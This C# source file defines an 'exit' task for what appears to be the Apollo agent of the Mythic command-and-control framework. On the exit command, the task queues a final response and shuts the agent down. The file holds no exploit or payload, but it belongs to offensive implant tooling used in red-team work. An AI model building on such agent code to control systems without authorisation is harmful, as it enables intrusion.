using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Tasks
{
    public class exit : Tasking
    {
        public exit(IAgent agent, Task data) : base(agent, data)
        {
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(() =>
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true));
                _agent.Exit();
            }, _cancellationToken.Token);
        }
    }
}
